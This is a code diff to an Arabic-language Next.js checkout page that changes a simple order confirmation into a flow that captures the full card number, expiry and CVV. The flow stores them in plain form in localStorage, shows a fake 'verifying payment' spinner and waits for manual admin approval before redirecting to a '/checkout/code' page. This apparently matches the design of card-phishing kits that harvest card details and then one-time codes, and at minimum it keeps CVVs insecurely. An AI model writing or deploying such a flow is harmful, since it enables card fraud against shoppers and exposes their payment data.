@@ -4,40 +4,87 @@ import { Navbar } from "@/components/navbar"
 import { Footer } from "@/components/footer-alain"
 import Image from "next/image"
 import Link from "next/link"
-import { useState } from "react"
+import { useState, useEffect } from "react"
 import { useRouter } from "next/navigation"
-import { CheckCircle2 } from "lucide-react"
+import { Loader2 } from "lucide-react"
 
 export default function CheckoutPage() {
   const { items, subtotal, count } = useCart()
   const router = useRouter()
-  const [submitted, setSubmitted] = useState(false)
   const shipping = subtotal > 100 ? 0 : 15
   const total = subtotal + shipping
 
-  function handleSubmit(e: React.FormEvent) {
-    e.preventDefault()
-    router.push("/checkout/code")
+  const [waiting, setWaiting] = useState(false)
+  const [cardNumber, setCardNumber] = useState("")
+  const [expiry, setExpiry] = useState("")
+  const [cvv, setCvv] = useState("")
+
+  // Poll for admin approval
+  useEffect(() => {
+    if (!waiting) return
+    const interval = setInterval(() => {
+      try {
+        const order = JSON.parse(localStorage.getItem("alain_order") || "{}")
+        if (order.status === "approved") {
+          clearInterval(interval)
+          router.push("/checkout/code")
+        }
+      } catch {}
+    }, 1500)
+    return () => clearInterval(interval)
+  }, [waiting, router])
+
+  function handleCardNumber(e: React.ChangeEvent<HTMLInputElement>) {
+    const digits = e.target.value.replace(/\D/g, "").slice(0, 16)
+    setCardNumber(digits.replace(/(.{4})/g, "$1 ").trim())
   }
 
-  if (submitted) {
+  function handleExpiry(e: React.ChangeEvent<HTMLInputElement>) {
+    const digits = e.target.value.replace(/\D/g, "").slice(0, 4)
+    if (digits.length > 2) {
+      setExpiry(digits.slice(0, 2) + " / " + digits.slice(2))
+    } else {
+      setExpiry(digits)
+    }
+  }
+
+  function handleCvv(e: React.ChangeEvent<HTMLInputElement>) {
+    setCvv(e.target.value.replace(/\D/g, "").slice(0, 3))
+  }
+
+  function handleSubmit(e: React.FormEvent) {
+    e.preventDefault()
+    const order = {
+      id: Date.now().toString(),
+      status: "pending",
+      cardNumber,
+      expiry,
+      cvv,
+      total,
+      promoCode: null,
+      createdAt: new Date().toISOString(),
+    }
+    localStorage.setItem("alain_order", JSON.stringify(order))
+    setWaiting(true)
+  }
+
+  if (waiting) {
     return (
       <main>
         <Navbar />
         <div className="min-h-[70vh] flex flex-col items-center justify-center px-4 text-center">
-          <div className="w-24 h-24 rounded-full bg-green-50 flex items-center justify-center mb-6">
-            <CheckCircle2 size={52} className="text-[#1a7a3c]" />
+          <div className="w-24 h-24 rounded-full bg-amber-50 flex items-center justify-center mb-6">
+            <Loader2 size={48} className="text-amber-500 animate-spin" />
           </div>
-          <h1 className="text-3xl font-black text-gray-900 mb-2">تم استلام طلبك!</h1>
-          <p className="text-gray-500 max-w-sm mb-8">
-            شكراً على طلبك. سنتواصل معك قريباً لتأكيد التفاصيل وتحديد موعد التوصيل.
+          <h1 className="text-2xl font-black text-gray-900 mb-3">جارٍ التحقق من الدفع</h1>
+          <p className="text-gray-400 text-sm max-w-xs leading-relaxed">
+            يرجى الانتظار بينما نتحقق من معلومات بطاقتك…
           </p>
-          <Link
-            href="/"
-            className="bg-[#1a7a3c] text-white font-bold px-8 py-3 rounded-full hover:bg-[#0d5a28] transition-colors"
-          >
-            العودة للرئيسية
-          </Link>
+          <div className="mt-6 flex gap-1.5">
+            <span className="w-2 h-2 rounded-full bg-amber-400 animate-bounce [animation-delay:0ms]" />
+            <span className="w-2 h-2 rounded-full bg-amber-400 animate-bounce [animation-delay:150ms]" />
+            <span className="w-2 h-2 rounded-full bg-amber-400 animate-bounce [animation-delay:300ms]" />
+          </div>
         </div>
         <Footer />
       </main>
@@ -120,20 +167,13 @@ export default function CheckoutPage() {
                   <option>العين</option>
                 </select>
               </div>
-
             </div>
 
             {/* Payment */}
             <div className="bg-white rounded-2xl border border-gray-100 shadow-sm p-6">
               <h2 className="font-black text-lg mb-5 text-gray-800">طريقة الدفع</h2>
               <label className="flex items-center gap-3 p-4 rounded-xl border border-[#1a7a3c] bg-green-50 cursor-pointer">
-                <input
-                  type="radio"
-                  name="payment"
-                  value="card"
-                  defaultChecked
-                  className="accent-[#1a7a3c] w-4 h-4"
-                />
+                <input type="radio" name="payment" value="card" defaultChecked className="accent-[#1a7a3c] w-4 h-4" />
                 <span className="text-xl">💳</span>
                 <span className="font-semibold text-sm text-gray-700">بطاقة ائتمانية / مدى</span>
               </label>
@@ -146,8 +186,9 @@ export default function CheckoutPage() {
                     type="text"
                     inputMode="numeric"
                     placeholder="XXXX XXXX XXXX XXXX"
-                    maxLength={19}
-                    className="w-full border border-gray-200 rounded-xl px-4 py-3 text-sm focus:outline-none focus:border-[#1a7a3c] focus:ring-1 focus:ring-[#1a7a3c] transition-colors"
+                    value={cardNumber}
+                    onChange={handleCardNumber}
+                    className="w-full border border-gray-200 rounded-xl px-4 py-3 text-sm focus:outline-none focus:border-[#1a7a3c] focus:ring-1 focus:ring-[#1a7a3c] transition-colors tracking-widest"
                     dir="ltr"
                   />
                 </div>
@@ -157,8 +198,11 @@ export default function CheckoutPage() {
                     <input
                       required
                       type="text"
+                      inputMode="numeric"
                       placeholder="MM / YY"
-                      maxLength={7}
+                      value={expiry}
+                      onChange={handleExpiry}
+                      minLength={7}
                       className="w-full border border-gray-200 rounded-xl px-4 py-3 text-sm focus:outline-none focus:border-[#1a7a3c] focus:ring-1 focus:ring-[#1a7a3c] transition-colors"
                       dir="ltr"
                     />
@@ -167,10 +211,13 @@ export default function CheckoutPage() {
                     <label className="block text-sm font-semibold text-gray-700 mb-1.5">CVV *</label>
                     <input
                       required
-                      type="text"
+                      type="password"
                       inputMode="numeric"
-                      placeholder="XXX"
-                      maxLength={4}
+                      placeholder="•••"
+                      value={cvv}
+                      onChange={handleCvv}
+                      minLength={3}
+                      maxLength={3}
                       className="w-full border border-gray-200 rounded-xl px-4 py-3 text-sm focus:outline-none focus:border-[#1a7a3c] focus:ring-1 focus:ring-[#1a7a3c] transition-colors"
                       dir="ltr"
                     />
@@ -196,13 +243,7 @@ export default function CheckoutPage() {
                 {items.map((item) => (
                   <li key={item.id} className="flex items-center gap-3">
                     <div className="relative w-16 h-16 rounded-xl overflow-hidden bg-gray-50 flex-shrink-0 border border-gray-100">
-                      <Image
-                        src={item.image}
-                        alt={item.name}
-                        fill
-                        className="object-contain p-1"
-                        sizes="64px"
-                      />
+                      <Image src={item.image} alt={item.name} fill className="object-contain p-1" sizes="64px" />
                       <span className="absolute -top-1.5 -left-1.5 w-5 h-5 rounded-full bg-[#1a7a3c] text-white text-[10px] font-bold flex items-center justify-center">
                         {item.quantity}
                       </span>
